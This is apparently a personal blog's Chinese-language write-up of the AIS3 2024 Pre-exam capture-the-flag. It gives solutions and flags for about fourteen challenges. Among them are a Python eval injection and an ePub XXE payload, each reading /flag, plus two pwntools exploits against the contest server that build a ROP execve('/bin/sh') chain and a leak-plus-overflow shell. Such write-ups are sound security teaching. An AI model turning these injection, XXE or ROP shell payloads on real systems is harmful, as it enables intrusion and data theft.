---
layout: post
title: AIS3 2024 Pre-exam
date: 2024-8-10
categories: [ais3, ctf, writeup]
---

# Welcome

## Solve

打開題目就有 flag

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/welcome-solve.png)

## Flag

`AIS3{Welc0me_to_AIS3_PreExam_2o24!}`

# Quantum Nim Heist

## Vulnerability

從 `server.py` 的 `play` 可以看到 `choice` 不等於 0, 1, 2 時會直接換 ai 下

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/quantum-nim-heist-vulnerability.png)

## Solve

先隨意移動一次寫入 `count`, `pile` 之後 print 才不會 error

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/quantum-nim-heist-solve-1.png)

接著輸入 `3` 直到剩下一堆，拿走全部獲勝並取得 flag

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/quantum-nim-heist-solve-2.png)

## Flag

`AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}`

# Three Dimensional Secret

# Solve

隨意 follow 一個 tcp stream 看到封包在傳送 G-code

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/three-dimensional-secret-solve-1.png)

使用[線上 G-code 模擬器](https://nraynaud.github.io/webgcode/)畫出 flag

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/three-dimensional-secret-solve-2.png)

## Flag

`AIS3{b4d1y_tun3d_PriN73r}`

# Emoji Console

## Solve

``🐱 ⭐`` `cat *` 印出所有檔案看到 source code 及發現 `./flag` 

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/emoji-console-solve-1.png)

`💿 🚩😜🤬 🐱 ⭐`  `cd flag;p#$%&! cat *` 進到 `./flag` 並印出所有檔案，找到 `flag-printer.py`

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/emoji-console-solve-2.png)

`💿 🚩😜🤬 🐍 ⭐` `cd flag;p#$%&! python *` 執行 `flag-printer.py` 取得 flag

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/emoji-console-solve-3.png)


## Flag

`AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}`

# Hash Guesser

## Vulnerability

從 `app.py` 看到使用 `util.is_same_image` 比較圖片

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/hash-guesser-vulnerability-1.png)

trace source code 發現沒有比較大小的部份，猜測會才切成較小的圖片再比較，如此全黑或全白的 1\*1 照片有 1/2 機率正確

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/hash-guesser-vulnerability-2.png)

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/hash-guesser-vulnerability-3.png)

## Solve

生成 1\*1 全黑的照片

```python
image = Image.new("L", (1, 1), 0)
image.putdata([0])
image.save('img.png')
```
多嘗試幾次後取得 flag

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/hash-guesser-solve.png)

## Flag

`AIS3{https://github.com/python-pillow/Pillow/issues/2982}`

# Evil Calculator

## Vulnerability

在 `app.py` 中看到此計算機是用 `eval()` 來計算，所以可以注入 python 程式

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/evil-calculator-vulnerability.png)

## Solve

利用 burpsuite 攔截 request 將 `expression` 改成 `open('/flag').read()` 就成功取得 flag

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/evil-calculator-solve.png)

## Flag

`AIS3{7RiANG13_5NAK3_I5_50_3Vi1}`

# Ebook Parser

reference: [This book reads you - exploiting services and readers that support the ePub book format](https://s1gnalcha0s.github.io/epub/2017/01/25/This-book-reads-you.html)

## Vulnerability

ebook metadata 是以 xml 形式紀錄所以嘗試使用 XXE 攻擊

## Solve

先用 python 新增簡單的 ebook file
```python
from ebooklib import epub

book = epub.EpubBook()

book.set_title("test")
book.set_language("en")
book.add_author("unicorn")

epub.write_epub("test.epub", book, {})
```

解壓縮 `test.epub`，編輯 `EPUB/content.opf` 注入 XXE payload 後再重新壓縮回 `test.epub`

```xml
<!DOCTYPE data [<!ENTITY flag SYSTEM "file:///flag">]>
...
    <dc:title>&flag;</dc:title>
```
上傳後成功取得 flag

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/ebook-parser-solve.png)


## Flag

`AIS3{LP#1742885: lxml no longer expands external entities (XXE) by default}`

# The Long Print

## Solve

利用 ida 把 `sleep` 時間 patch 成 1 秒

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/the-long-print-solve-1.png)

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/the-long-print-solve-2.png)

執行程式並在 flag 消失前記下

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/the-long-print-solve-3.png)

## Flag

`AIS3{You_are_the_master_of_time_management!!!!?}`

# 火拳のエース

## Solve

先利用 ida 把 `usleep` 時間 patch 成 1 秒

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/火拳のエース-solve-1.png)

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/火拳のエース-solve-2.png)

看出程式會將剩下的 flag 分為四個長度 8 的 stirng，並分別 `xor_strings`、`complex_function` 每個字元後必須與 `"DHLIYJEG", "MZRERYND", "RUYODBAH", "BKEMPBRE"` 相同

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/火拳のエース-solve-3.png)

在 gdb 設定 break point 於 `xor_strings` 找出 flag 會 xor 的 string，分別為：

first: `0xe     0xd     0x7d    0x6     0xf     0x17    0x76    0x4`
second: `0x6d    0x0     0x1b    0x7c    0x6c    0x13    0x62    0x11`
third: `0x1e    0x7e    0x6     0x13    0x7     0x66    0xe     0x71`
forth: `0x17    0x14    0x1d    0x70    0x79    0x67    0x74    0x33`

最後依照 ida 的 pseudo code 用 python 寫出，並 brute force 出 xor 後的字元，再與前面找出的 xor string 進行 xor 就得到 flag

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/火拳のエース-solve-4.png)


```python
def complex_function(a1, a2):
    v8 = (17 * a2 + a1 - 65) % 26
    v7 = a2 % 3 + 3
    if a2 % 3 == 2:
        v8 = (v8 - v7 + 26) % 26
    elif a2 % 3 == 1:
        v8 = (2 * v7 + v8) % 26
    else:
        v8 = (v7 * v8 + 7) % 26
    return chr(v8 + 65)

s = ["DHLIYJEG", "MZRERYND", "RUYODBAH", "BKEMPBRE"]
xored = ["", "", "", ""]
for i in range(8):
    for j in range(4):
        for k in range(26):
            if s[j][i] == complex_function(k + ord('A'), i + 32 * j):
                xored[j] += chr(k + ord('A'))

print(xored)

xor = [[0xe, 0xd, 0x7d, 0x6, 0xf, 0x17, 0x76, 0x4],
       [0x6d, 0x0, 0x1b, 0x7c, 0x6c, 0x13, 0x62, 0x11],
       [0x1e, 0x7e, 0x6, 0x13, 0x7, 0x66, 0xe, 0x71],
       [0x17, 0x14, 0x1d, 0x70, 0x79, 0x67 ,0x74 ,0x33]]

flag = ["", "", "", ""]
for i in range(4):
    for j in range(8):
        flag[i] += chr(ord(xored[i][j]) ^ xor[i][j])

print("AIS3{G0D" + "".join(flag))
```

```
['QIIKAHBJ', 'TRDMYLWD', 'NMTLWVYB', 'ERHAXFUN']
AIS3{G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!}
```

## Flag

`AIS3{G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!}`

# faker's Really OP meow way

## Solve

使用 ida 把生成亂數的檔案從 `/dev/urandom` 改成自行生成全為 `\x00` 的 `randomnumber`

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/fakers-really-OP-meow-way-solve-1.png)

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/fakers-really-OP-meow-way-solve-2.png)

先將 `flag.txt` 寫為 `AIS3{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}` 作為 placeholder

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/fakers-really-OP-meow-way-solve-3.png)

在 `memcmp` 設定 break point 以 dump 記憶體，觀察發現正確的字元會顯示 `0x00`，接著使用 python 輔助將還沒解出的字元全部改為某個測試字元，藉此手動比較 `memcpy` 的記憶體來 brute force 直到所有結果皆為 `0x00` 為止

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/fakers-really-OP-meow-way-solve-4.png)

```python
flag = "AIS3{******************************************}"
test_char = '3'

for i in range(48):
    if flag[i] == '*':
        flag = flag[:i] + test_char + flag[i+1:]

print(flag)
```

## Flag

`AIS3{r3v3r51n6_r0p_15_c00l_r16h7???}`

# PixelClicker_Revenge

## Solve

在 x64dbg 找到會跳到 `FAIL\n` 的兩個判斷位置，設定 break point 後，根據提示多次嘗試發現為點擊位置的 x, y 座標

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-1.png)

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-2.png)

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-3.png)

接著將會比較範圍的 memory dump 出來，結束的值從 ida 可以簡單看出

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-4.png)

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-5.png)

接著用 python 畫出所有的點就得到 flag

```python
import numpy as np
from PIL import Image, ImageDraw

with open('./MEM_000000756D179890_00003F90.mem', 'rb') as f:
    data = f.read()

img = np.zeros((400, 400))
flag = Image.fromarray(img, mode = 'L')
draw = ImageDraw.Draw(flag)
path = []

for i in range(0, len(data), 8):
    x = int.from_bytes(data[i : i + 4], 'little')
    y = int.from_bytes(data[i + 4: i + 8], 'little')
    path.append((x, y))

draw.point(path, fill = 255)

flag.save("flag.jpg")
```

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/pixelclicker-revenge-solve-6.jpg)

## Flag

`AIS3{nOw_Ur_A_p4int3r_M4steR}`

# babyRSA

## Vulnerability

`encrypt` 可以看到每次都只會加密一個字元，因此將所有字元都用相同 key encrypt 建表後，對照就能得到 flag

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/babyrsa-vulnerability.png)

## Solve

```python
from babyRSA import encrypt

# input output.txt here
e, n, c = 

table = []

for m in range(1, 256):
    table.append(encrypt((e, n), chr(m))[0])

flag = ""
for crypt in c:
    flag += chr(table.index(crypt) + 1)
print(flag)
```

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/babyrsa-solve.png)

## Flag

`AIS3{NeverUseTheCryptographyLibraryImplementedYourSelf}`

# Mathter

## Vulnerability

在 ghidra 中看到可以透過 `gets` 來 buffer overflow，且 NX enable 所以要使用 rop chain

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/mather-vulnerability-1.png)

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/mather-vulnerability-2.png)

## Solve

```python
from pwn import *

p = remote("chals1.ais3.org", 50001)

# use ROPgadget to find gadgets
pop_rdi = 0x0000000000402540 # pop rdi ; ret
pop_rsi = 0x00000000004126a3 # pop rsi ; ret
pop_rax_rdx_rbx = 0x000000000047b916 # pop rax ; pop rdx ; pop rbx ; ret
mov = 0x0000000000419700 # mov qword ptr [rdx], rax ; ret
syscall = 0x00000000004013ea # syscall
# an empty address for writing "/bin/sh" string
bin_sh = 0x00000000004bc000

# go to goodbye function
p.sendline(b'q')

# build rop chain payload
payload = b"".join([
    # pad to rbp
    b'y',
    b'A' * 11,

    # write "/bin/sh"
    p64(pop_rax_rdx_rbx),
    b'/bin/sh\x00',
    p64(bin_sh),
    p64(0x0),
    p64(mov),

    # set rax to 0x3b for sys_execve syscall
    # set rdx to 0x00 for no envp[]
    p64(pop_rax_rdx_rbx),
    p64(0x3b),
    p64(0x0),
    p64(0x0),

    # set rdi to address of "/bin/sh" string for filename to execute
    p64(pop_rdi),
    p64(bin_sh),

    # set rsi to 0x00 for no argv[]
    p64(pop_rsi),
    p64(0x0),

    # trigger syscall
    p64(syscall)
])

# send rop chain payload
p.sendline(payload)

# for interactive shell
p.interactive()
```

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/mather-solve.png)

## Flag

`AIS3{0mg_k4zm4_mu57_b3_k1dd1ng_m3_2e89c9}`

# Base64 Encoder

## Solve

從 `main` 可以看到 `scanf` 沒有限制長度可以 buffer overflow

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/base64-encoder-solve-1.png)

從 gdb 看出要 pad 0x48 個字元才能蓋到 rbp

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/base64-encoder-solve-2.png)

從 `base64_encoding` 看出可以讓 `table` 的 index 變成負的來 leak address，gdb break 在 `base64_encoding` 找出 `table` 前面的 address 為 `main+299`

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/base64-encoder-solve-3.png)

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/base64-encoder-solve-4.png)

```python
from pwn import *

# a.out is the binaray with comment uncommented
p = process("./a.out")

# find the input for getting negetive index
for i in range(1, 256):
    if i == 10:
        continue
    p.recvuntil(b"Text:")
    p.sendline(b'\xff\xff' + chr(i).encode())
    print(i, p.recvline())
```

```python
from pwn import *

# p = process("./base64encoder")
# gdb.attach(p)
p = remote("chals1.ais3.org", 50002)

# the value of index -1 to -8 of table is the address of main+299
# 63 b' Result: -1 -17 -4 -1\n'
# 62 b' Result: -1 -17 -4 -2\n'
# 61 b' Result: -1 -17 -4 -3\n'
# 60 b' Result: -1 -17 -4 -4\n'
# 59 b' Result: -1 -17 -4 -5\n'
# 58 b' Result: -1 -17 -4 -6\n'
# 57 b' Result: -1 -17 -4 -7\n'
# 56 b' Result: -1 -17 -4 -8\n'

main_299 = 0

# leak main+299 address
for i in [63, 62, 61, 60, 59, 58, 57, 56]:
    p.recvuntil(b"Text:")
    p.sendline(b'\xff\xff' + chr(i).encode())
    main_299 <<= 8
    main_299 |= p.recvline()[-2]

log.success(hex(main_299))
# calculate address of Vincent55Orz base on main+299
log.success(hex(main_299 - 0x3cf))
# jump to Vincent55Orz for unknow reason doesn't work,
# so jump to system("sh") directly instead (+23 offset)
p.sendline(b"A" * 0x40 + p64(1) + p64(main_299 - 0x3cf + 23))
p.recvuntil(b"Text:")
# send emptyline to trigger ret for main
p.sendline()

# interactive shell
p.interactive()
```

![image]({{site.baseurl}}/assets/images/AIS3-2024-pre-exam-writeup/base64-encoder-solve-5.png)

## Flag

`AIS3{1_g0t_WA_on_my_H0m3work_Do_YoU_h4v3_aNY_idea???_22281a41372450db}`